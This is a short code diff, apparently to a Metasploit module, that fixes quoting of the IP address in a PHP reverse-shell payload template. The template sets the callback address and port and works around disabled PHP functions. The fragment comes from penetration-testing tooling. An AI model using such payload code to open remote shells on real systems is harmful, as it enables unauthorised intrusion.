@@ -69,7 +69,7 @@ module Metasploit3
 		end		
 
 		shell=<<-END_OF_PHP_CODE
-		$ipaddr=#{ipaddr};
+		$ipaddr='#{ipaddr}';
 		$port=#{port};
 		#{php_preamble({:disabled_varname => "$dis"})}
 
